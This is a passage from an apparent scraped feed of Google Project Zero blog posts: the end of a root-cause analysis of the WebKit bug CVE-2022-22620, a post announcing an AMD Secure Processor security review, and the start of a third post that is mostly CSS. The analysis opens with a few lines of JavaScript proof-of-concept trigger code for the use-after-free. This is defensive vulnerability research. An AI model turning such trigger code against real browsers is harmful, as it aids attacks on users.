 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; input</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">focus</span><span class="ZslSztaQWN-c2">();</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; input</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">onblur </span><span class="ZslSztaQWN-c2">=</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">()</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">=&gt;</span><span class="ZslSztaQWN-c0">&nbsp;history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">replaceState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;state3&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">&nbsp; &nbsp; &nbsp; &nbsp; setTimeout</span><span class="ZslSztaQWN-c2">(()</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c2">=&gt;</span><span class="ZslSztaQWN-c0">&nbsp;history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">back</span><span class="ZslSztaQWN-c2">(),</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c3">1000</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c2">},</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c3">1000</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c20"><span class="ZslSztaQWN-c0 ZslSztaQWN-c6"></span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>In both the 2013 and 2022 cases, the root vulnerability is that the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;is not correctly reference-counted. In 2013, the developers did a great job of patching all the different paths to trigger the vulnerability, not just the one in the submitted proof-of-concept. This meant that they had also killed the vulnerability in </span><span class="ZslSztaQWN-c4">loadInSameDocument</span><span class="ZslSztaQWN-c5">. The refactoring in December 2016 then revived the vulnerability to enable it to be exploited in-the-wild and re-patched in 2022.</span></p><h1 class="ZslSztaQWN-c31 ZslSztaQWN-c19" id="h.x9lxjo77j0n3"><span class="ZslSztaQWN-c8 ZslSztaQWN-c6">Conclusion</span></h1>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Usually when we talk about variants, they exist due to incomplete patches: the vendor doesn&rsquo;t correctly and completely fix the reported vulnerability. However, for CVE-2022-22620 the vulnerability was correctly and completely fixed in 2013. </span><span>Its </span><span>fix was just regressed</span><span>&nbsp;in 2016</span><span>&nbsp;during refactoring</span><span>. We don&rsquo;t know how long an attacker was exploiting this vulnerability in-the-wild, but we do know that the vulnerability existed (again) for 5 years: December 2016 until January 2022.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">There&rsquo;s no easy answer for what should have been done differently. The developers responding to the initial bug report in 2013 followed a lot of best-practices: </span></p><ul class="c22 lst-kix_ziaggw1wsf95-0 start"><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c5">Patched all paths to trigger the vulnerability, not just the one in the proof-of-concept. This meant that they patched the variant that would become CVE-2022-22620.</span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c5">Submitted a test case with the patch.</span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c5">Detailed commit messages explaining the vulnerability and how they were fixing it.</span></li><li class="c12 c19 c23 li-bullet-0"><span class="ZslSztaQWN-c5">Additional hardening measures during deserialization.</span></li></ul>
 <p class="ZslSztaQWN-c11 ZslSztaQWN-c41"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">As an offensive security research team, we can make assumptions about what we believe to be the core challenges facing modern software development teams: legacy code, short reviewer turn-around expectations, refactoring and security efforts are generally under-appreciated and under-rewarded, and lack of memory safety mitigations. Developers and security teams need time to review patches, especially for security issues, and rewarding these efforts, will make a difference. It also will save the vendor resources in the long run. In this case, 9 years after a vulnerability was initially triaged, patched, tested, and released, the whole process had to be duplicated again, but this time under the pressure of in-the-wild exploitation. </span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>While this case study was a 0-day in Safari/WebKit, this is not an issue unique to Safari. Already in 2022, we&rsquo;ve seen in-the-wild 0-days that are variants of previously disclosed bugs targeting Chromium, Windows, Pixel, and iOS as well.</span><span>&nbsp;It&rsquo;s a good reminder that as defenders we all need to stay vigilant in reviewing and auditing code and patches. </span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/2485989426162409270/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2485989426162409270
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2485989426162409270
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html
## @title
An Autopsy on a Zombie In-the-Wild 0-day
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-6171588576768270104
## published
10/05/2022 16:00:00
## updated
08/06/2022 18:08:01
## title
## @type
text
## #text
Release of Technical Report into the AMD Security Processor
## content
## @type
html
## #text
<style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.RmvCPDuePa-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.RmvCPDuePa-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.RmvCPDuePa-c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.RmvCPDuePa-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.RmvCPDuePa-c6{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.RmvCPDuePa-c4{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.RmvCPDuePa-c1{color:inherit;text-decoration:inherit}.RmvCPDuePa-c5{border:1px solid black;margin:5px}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="RmvCPDuePa-c4">
 <p class="RmvCPDuePa-c7"><span class="RmvCPDuePa-c0">Posted by James Forshaw, Google Project Zero</span></p>
 <p class="RmvCPDuePa-c3"><span class="RmvCPDuePa-c0"></span></p>
 <p class="RmvCPDuePa-c7"><span>Today</span><span>, members of Project Zero and the Google Cloud security team are releasing a </span><span class="RmvCPDuePa-c6"><a class="RmvCPDuePa-c11" href="https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/AMD_GPZ-Technical_Report_FINAL_05_2022.pdf">technical report</a></span><span class="RmvCPDuePa-c0">&nbsp;on a security review of AMD Secure Processor (ASP). The ASP is an isolated ARM processor in AMD EPYC CPUs that adds a root of trust and controls secure system initialization. As it&#39;s a generic processor AMD can add additional security features to the firmware, but like with all complex systems it&#39;s possible these features might have security issues which could compromise the security of everything under the ASP&#39;s management.</span></p>
 <p class="RmvCPDuePa-c3"><span class="RmvCPDuePa-c0"></span></p>
 <p class="RmvCPDuePa-c7"><span>The security review undertaken was on the implementation of the ASP on the 3rd Gen AMD EPYC CPUs (codenamed &quot;Milan&quot;). One feature of the ASP of </span><span>interest</span><span>&nbsp;to Google is </span><span class="RmvCPDuePa-c6"><a class="RmvCPDuePa-c11" href="https://www.amd.com/en/processors/amd-secure-encrypted-virtualization">Secure Encrypted Virtualization (SEV)</a></span><span>. SEV adds encryption to the memory used by virtual machines running on the CPU. This feature is of importance to </span><span class="RmvCPDuePa-c6"><a class="RmvCPDuePa-c11" href="https://cloud.google.com/confidential-computing">Confidential Computing</a></span><span class="RmvCPDuePa-c0">&nbsp;as it provides protection of customer cloud data in use, not just at rest or when sending data across a network.</span></p>
 <p class="RmvCPDuePa-c3"><span class="RmvCPDuePa-c0"></span></p>
 <p class="RmvCPDuePa-c7"><span>A particular emphasis of the review was on the Secure Nested Paging (SNP) extension to SEV added to &quot;Milan&quot;. SNP aims to further improve the security of confidential computing by adding integrity protection and mitigations for numerous side-channel attacks. </span><span>The review was undertaken with full cooperation with AMD. The team was granted access to source code for the ASP, and production samples to test hardware attacks. </span></p>
 <p class="RmvCPDuePa-c3"><span class="RmvCPDuePa-c0"></span></p>
 <p class="RmvCPDuePa-c7"><span>The review discovered 19 </span><span>issues</span><span>&nbsp;which have been fixed by AMD in public security bulletins. These issues ranged from incorrect use of cryptography to memory corruption in the context of the ASP firmware. The report describes some of the more interesting issues that were uncovered during the review as well as providing a background on the ASP and the process the team took to find security issues. </span><span>You can read more about the review on the </span><span class="RmvCPDuePa-c6"><a class="RmvCPDuePa-c11" href="https://cloud.google.com/blog/products/identity-security/google-amd-partner-to-build-a-more-secure-future-with-confidential-computing">Google Cloud security blog</a></span><span>&nbsp;</span><span>and the </span><span class="RmvCPDuePa-c6"><a class="RmvCPDuePa-c11" href="https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/AMD_GPZ-Technical_Report_FINAL_05_2022.pdf">final report</a></span><span>.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/6171588576768270104/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/05/release-of-technical-report-into-amd.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6171588576768270104
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6171588576768270104
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/05/release-of-technical-report-into-amd.html
## @title
Release of Technical Report into the AMD Security Processor
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-3023870154175197326
## published
19/04/2022 13:06:00
## updated
24/08/2022 16:00:49
## title
## @type
text
## #text
The More You Know, The More You Know You Dont Know
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_qhs0t3wlsx02-8>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-8}ol.lst-kix_h2vtkcla8l9d-2.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-2 0}ul.lst-kix_9i24fh2252ug-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-3>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-3}ul.lst-kix_9i24fh2252ug-0{list-style-type:none}ul.lst-kix_9i24fh2252ug-3{list-style-type:none}ul.lst-kix_9i24fh2252ug-2{list-style-type:none}ul.lst-kix_9i24fh2252ug-5{list-style-type:none}ul.lst-kix_9i24fh2252ug-4{list-style-type:none}ul.lst-kix_9i24fh2252ug-7{list-style-type:none}.lst-kix_czzguda5pqu4-1>li{counter-increment:lst-ctn-kix_czzguda5pqu4-1}ul.lst-kix_9i24fh2252ug-6{list-style-type:none}.lst-kix_jdourvkzhmg1-7>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-7}ul.lst-kix_9i24fh2252ug-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-4{list-style-type:none}ul.lst-kix_718o7hzyu4f-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-3{list-style-type:none}ul.lst-kix_718o7hzyu4f-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-6{list-style-type:none}ul.lst-kix_grz5i5wr9ig-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-7{list-style-type:none}ol.lst-kix_czzguda5pqu4-8.start{counter-reset:lst-ctn-kix_czzguda5pqu4-8 0}ul.lst-kix_bqyk3pvm93qj-0{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-8{list-style-type:none}ul.lst-kix_718o7hzyu4f-5{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-7{list-style-type:none}ul.lst-kix_718o7hzyu4f-6{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-6{list-style-type:none}ul.lst-kix_718o7hzyu4f-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-8 0}ol.lst-kix_jdourvkzhmg1-4.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-4 0}ul.lst-kix_bqyk3pvm93qj-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-3{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-2{list-style-type:none}ul.lst-kix_718o7hzyu4f-7{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-1{list-style-type:none}ul.lst-kix_718o7hzyu4f-8{list-style-type:none}.lst-kix_g56cmc7ljnve-4>li:before{content:"\0025cb  "}.lst-kix_g56cmc7ljnve-5>li:before{content:"\0025a0  "}.lst-kix_1mxsacho6zj1-0>li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-1>li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-1>li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-3.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-3 0}.lst-kix_qhs0t3wlsx02-4>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-4,lower-latin) ". "}.lst-kix_qhs0t3wlsx02-6>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-6,decimal) ". "}ol.lst-kix_h2vtkcla8l9d-7.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-7 0}.lst-kix_g56cmc7ljnve-3>li:before{content:"\0025cf  "}.lst-kix_g56cmc7ljnve-7>li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-0>li:before{content:"\0025cf  "}.lst-kix_qhs0t3wlsx02-5>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-5,lower-roman) ". "}.lst-kix_g56cmc7ljnve-0>li:before{content:"\0025cf  "}.lst-kix_g56cmc7ljnve-1>li:before{content:"\0025cb  "}.lst-kix_g56cmc7ljnve-8>li:before{content:"\0025a0  "}.lst-kix_qhs0t3wlsx02-8>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-8,lower-roman) ". "}.lst-kix_9i24fh2252ug-3>li:before{content:"\0025cf  "}.lst-kix_qhs0t3wlsx02-0>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-0,decimal) ". "}.lst-kix_h2vtkcla8l9d-1>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-1}.lst-kix_qhs0t3wlsx02-7>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-7,lower-latin) ". "}.lst-kix_g56cmc7ljnve-2>li:before{content:"\0025a0  "}ul.lst-kix_rvy0q9fw47sg-8{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-7{list-style-type:none}.lst-kix_9i24fh2252ug-2>li:before{content:"\0025a0  "}ul.lst-kix_rvy0q9fw47sg-6{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-5{list-style-type:none}.lst-kix_czzguda5pqu4-8>li{counter-increment:lst-ctn-kix_czzguda5pqu4-8}ul.lst-kix_rvy0q9fw47sg-4{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-3{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-2{list-style-type:none}.lst-kix_qhs0t3wlsx02-4>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-4}ul.lst-kix_bfmkl5o48mun-0{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-1{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-0{list-style-type:none}ul.lst-kix_bfmkl5o48mun-2{list-style-type:none}ul.lst-kix_bfmkl5o48mun-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-7>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-7}.lst-kix_g56cmc7ljnve-6>li:before{content:"\0025cf  "}ul.lst-kix_3zaknyhdqv25-0{list-style-type:none}ul.lst-kix_3zaknyhdqv25-2{list-style-type:none}ul.lst-kix_3zaknyhdqv25-1{list-style-type:none}ul.lst-kix_3zaknyhdqv25-4{list-style-type:none}ul.lst-kix_3zaknyhdqv25-3{list-style-type:none}ul.lst-kix_3zaknyhdqv25-6{list-style-type:none}ul.lst-kix_3zaknyhdqv25-5{list-style-type:none}ul.lst-kix_3zaknyhdqv25-8{list-style-type:none}ul.lst-kix_3zaknyhdqv25-7{list-style-type:none}.lst-kix_jdourvkzhmg1-5>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-5}ul.lst-kix_givsp5ka59r-1{list-style-type:none}ul.lst-kix_givsp5ka59r-2{list-style-type:none}ul.lst-kix_givsp5ka59r-3{list-style-type:none}ul.lst-kix_givsp5ka59r-4{list-style-type:none}ul.lst-kix_givsp5ka59r-0{list-style-type:none}.lst-kix_qhs0t3wlsx02-1>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-1,lower-latin) ". "}.lst-kix_qhs0t3wlsx02-2>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-2,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-3>li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-3,decimal) ". "}ol.lst-kix_qhs0t3wlsx02-8.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-8 0}.lst-kix_qhs0t3wlsx02-2>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-2}.lst-kix_h2vtkcla8l9d-1>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-1,lower-latin) ". "}ul.lst-kix_givsp5ka59r-5{list-style-type:none}ul.lst-kix_givsp5ka59r-6{list-style-type:none}.lst-kix_jdourvkzhmg1-8>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-8,lower-roman) ". "}ul.lst-kix_givsp5ka59r-7{list-style-type:none}.lst-kix_rvy0q9fw47sg-4>li:before{content:"\0025cb  "}ul.lst-kix_givsp5ka59r-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-3 0}.lst-kix_czzguda5pqu4-5>li{counter-increment:lst-ctn-kix_czzguda5pqu4-5}.lst-kix_h2vtkcla8l9d-3>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-3,decimal) ". "}.lst-kix_h2vtkcla8l9d-5>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-5,lower-roman) ". "}.lst-kix_jdourvkzhmg1-2>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-2,lower-roman) ". "}.lst-kix_jdourvkzhmg1-6>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-6,decimal) ". "}.lst-kix_rvy0q9fw47sg-2>li:before{content:"\0025a0  "}ol.lst-kix_czzguda5pqu4-7.start{counter-reset:lst-ctn-kix_czzguda5pqu4-7 0}.lst-kix_3zaknyhdqv25-7>li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-4>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-4,lower-latin) ". "}.lst-kix_rvy0q9fw47sg-0>li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-1.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-1 0}.lst-kix_bqyk3pvm93qj-0>li:before{content:"\0025cf  "}.lst-kix_3zaknyhdqv25-3>li:before{content:"\0025cf  "}ul.lst-kix_bfmkl5o48mun-4{list-style-type:none}ul.lst-kix_bfmkl5o48mun-3{list-style-type:none}.lst-kix_h2vtkcla8l9d-7>li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-7,lower-latin) ". "}ul.lst-kix_bfmkl5o48mun-6{list-style-type:none}ul.lst-kix_bfmkl5o48mun-5{list-style-type:none}ul.lst-kix_bfmkl5o48mun-8{list-style-type:none}ul.lst-kix_bfmkl5o48mun-7{list-style-type:none}.lst-kix_czzguda5pqu4-7>li{counter-increment:lst-ctn-kix_czzguda5pqu4-7}.lst-kix_jdourvkzhmg1-0>li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-0,decimal) ". "}.lst-kix_3zaknyhdqv25-5>li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-7{list-style-type:none}.lst-kix_9i24fh2252ug-7>li:before{content:"\0025cb  "}ul.lst-kix_knibgsincpme-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-7>li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-0.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-0 0}.lst-kix_rvy0q9fw47sg-6>li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-4>li:before{content:"\0025cb  "}ul.lst-kix_knibgsincpme-1{list-style-type:none}ul.lst-kix_knibgsincpme-2{list-style-type:none}.lst-kix_9i24fh2252ug-5>li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-0{list-style-type:none}ul.lst-kix_knibgsincpme-5{list-style-type:none}.lst-kix_1mxsacho6zj1-2>li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-6{list-style-type:none}ul.lst-kix_knibgsincpme-3{list-style-type:none}.lst-kix_rvy0q9fw47sg-8>li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-4{list-style-type:none}.lst-kix_3zaknyhdqv25-1>li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-4>li:before{content:"\0025cb  "}ul.lst-kix_1mxsacho6zj1-4{list-style-type:none}ul.lst-kix_1mxsacho6zj1-5{list-style-type:none}ul.lst-kix_1mxsacho6zj1-2{list-style-type:none}.lst-kix_grz5i5wr9ig-1>li:before{content:"\0025cb  "}ul.lst-kix_1mxsacho6zj1-3{list-style-type:none}.lst-kix_jdourvkzhmg1-3>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-3}ul.lst-kix_1mxsacho6zj1-0{list-style-type:none}.lst-kix_1mxsacho6zj1-6>li:before{content:"\0025cf  "}ul.lst-kix_1mxsacho6zj1-1{list-style-type:none}.lst-kix_givsp5ka59r-6>li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-8>li:before{content:"\0025a0  "}ul.lst-kix_1mxsacho6zj1-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-5>li:before{content:"\0025a0  "}ul.lst-kix_1mxsacho6zj1-6{list-style-type:none}ul.lst-kix_1mxsacho6zj1-7{list-style-type:none}.lst-kix_givsp5ka59r-8>li:before{content:"\0025a0  "}.lst-kix_rwsfzn4jdl6v-3>li:before{content:"\0025cf  "}ol.lst-kix_jdourvkzhmg1-5.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-5 0}ol.lst-kix_h2vtkcla8l9d-4.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-4 0}.lst-kix_jdourvkzhmg1-4>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-4}ol.lst-kix_jdourvkzhmg1-6.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-6 0}.lst-kix_rwsfzn4jdl6v-1>li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-8>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-8}.lst-kix_qhs0t3wlsx02-3>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-3}.lst-kix_czzguda5pqu4-7>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-7,lower-latin) ". "}.lst-kix_czzguda5pqu4-3>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-3,decimal) ". "}.lst-kix_czzguda5pqu4-5>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-5,lower-roman) ". "}ol.lst-kix_h2vtkcla8l9d-3.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-3 0}.lst-kix_knibgsincpme-1>li:before{content:"\0025cb  "}.lst-kix_czzguda5pqu4-1>li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-1,lower-latin) ". "}.lst-kix_czzguda5pqu4-6>li{counter-increment:lst-ctn-kix_czzguda5pqu4-6}.lst-kix_h2vtkcla8l9d-2>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-2}.lst-kix_knibgsincpme-5>li:before{content:"\0025a0  "}.lst-kix_knibgsincpme-4>li:before{content:"\0025cb  "}.lst-kix_knibgsincpme-6>li:before{content:"\0025cf  "}.lst-kix_knibgsincpme-3>li:before{content:"\0025cf  "}.lst-kix_knibgsincpme-7>li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-6>li{counter-increment:lst-ctn-kix_jdourvkzhmg1-6}.lst-kix_czzguda5pqu4-0>li{counter-increment:lst-ctn-kix_czzguda5pqu4-0}.lst-kix_h2vtkcla8l9d-4>li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-4}ol.lst-kix_jdourvkzhmg1-5{list-style-type:none}ol.lst-kix_jdourvkzhmg1-6{list-style-type:none}ol.lst-kix_jdourvkzhmg1-7.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-7 0}ol.lst-kix_jdourvkzhmg1-7{list-style-type:none}ol.lst-kix_jdourvkzhmg1-8{list-style-type:none}.lst-kix_qhs0t3wlsx02-7>li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-7}.lst-kix_bfmkl5o48mun-0>li:before{content:"\0025cf  "}ol.lst-kix_qhs0t3wlsx02-1.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-1 0}ol.lst-kix_czzguda5pqu4-0.start{counter-reset:lst-ctn-kix_czzguda5pqu4-0 0}.lst-kix_knibgsincpme-8>li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-7{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8{list-style-type:none}.lst-kix_bfmkl5o48mun-7>li:before{content:"\0025cb  "}.lst-kix_bfmkl5o48mun-8>li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-4{list-style-type:none}ol.lst-kix_jdourvkzhmg1-1.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-1 0}.lst-kix_bfmkl5o48mun-6>li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-5.start{counter-reset:lst-ctn-kix_czzguda5pqu4-5 0}ol.lst-kix_h2vtkcla8l9d-6{list-style-type:none}.lst-kix_grz5i5wr9ig-7>li:before{content:"\0025cb  